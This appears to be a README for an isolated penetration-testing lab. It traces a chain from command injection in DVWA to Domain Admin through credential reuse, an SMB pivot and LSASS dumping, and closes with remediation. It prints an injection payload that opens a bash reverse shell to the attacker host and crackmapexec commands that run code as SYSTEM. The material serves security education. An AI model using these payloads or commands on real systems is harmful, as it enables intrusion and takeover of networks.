# Web to Domain Admin Compromise Lab

This project simulates a real-world intrusion from a vulnerable web application to full domain compromise.

> Portfolio brief: [PORTFOLIO.zh-TW.md](PORTFOLIO.zh-TW.md)

# Summary

This project demonstrates how a single web vulnerability can be chained into a full Active Directory compromise.

The attack starts from a command injection flaw in a web application and progresses through credential extraction, lateral movement, and internal pivoting, ultimately achieving Domain Admin privileges.

This lab reflects real-world attack scenarios where misconfigurations such as credential reuse and poor network segmentation lead to critical security breaches.

This project was conducted in an isolated lab environment for educational and portfolio purposes.

# Scope

- Attacker: Kali Linux
- Web Server (Target): Ubuntu (DVWA)
- Workstation (Pivot): Windows 10 Pro (Dual-homed)
- Domain Controller: Windows Server 2022

# Network Architecture

```text
Kali (192.168.203.131)
→ External Network
Ubuntu/DVWA (192.168.203.130)
→ Windows 10 Workstation
(External: 192.168.203.132, Internal: 192.168.88.110)
→ Internal Network
Domain Controller (192.168.88.100)
```

# Attack Path

```text
External -> Web Exploit -> Credential Theft -> Lateral Movement -> Domain Compromise
```
<p align="center">
  <img src="evidence/core/attack-path.png" alt="Attack Diagram">
</p>

This represents a typical real-world attack chain from initial access to full domain compromise.

# Detailed Reports

- [English Report](report/Report.en.md)
- [中文報告](report/Report.zh-TW.md)

# Initial Access

## Vulnerability

Command Injection

## Method

- Injected command separators (`;`)
- Executed system commands
- Established reverse shell

## Payloads

```bash
127.0.0.1; whoami
127.0.0.1; bash -i >& /dev/tcp/192.168.203.131/4444 0>&1
```

## Root Cause

- No input validation
- Direct execution of user input

# Credential Access

## Source

`.env` configuration file

## Observation

- Credentials exposed
- Account reuse across systems

## Risk

Credential reuse enables pivoting into internal services.

# Lateral Movement

## Technique

SMB authentication

## Command

```bash
crackmapexec smb 192.168.203.132 -u svc-sql -p '<REDACTED>' -d lab
```

## Result

```text
lab\svc-sql:<REDACTED> (Pwn3d!)
```

# Internal Pivot

## Concept

Dual-homed workstation bridges networks.

## Command

```bash
crackmapexec smb 192.168.203.132 -u svc-sql -p '<REDACTED>' -d lab --exec-method smbexec -x whoami
```

## Result

```text
nt authority\system
```

This misconfiguration bypasses network segmentation and allows attackers to move between isolated network zones without triggering traditional perimeter defenses.

# Domain Enumeration

## Tools

- ipconfig
- arp -a
- nslookup

## Services

- Kerberos
- LDAP
- SMB

# Credential Dumping

## Technique

LSASS extraction

LSASS contains authentication material such as NTLM hashes and Kerberos tickets.

# Privilege Escalation

## Method

hashcat cracking

## Result

- Domain Admin credentials obtained
- Full domain compromise achieved

# Impact

This demonstrates how low-level vulnerabilities can escalate into critical compromise.

This highlights the importance of defense-in-depth, as a single point of failure can lead to full compromise.

- Full Active Directory control
- Data access
- Persistence capability
- Lateral movement across network

# Root Cause

- Credential Reuse
- Dual-homed Host
- Poor Network Segmentation
- Sensitive Data Exposure
- Excessive Privileges

# Remediation

- Enforce network segmentation
- Remove dual-homed systems
- Avoid credential reuse
- Implement MFA
- Secure configuration files
- Apply least privilege principle
- Monitor lateral movement using SIEM / EDR

Full raw screenshots and testing artifacts are available in the `evidence/raw` directory.
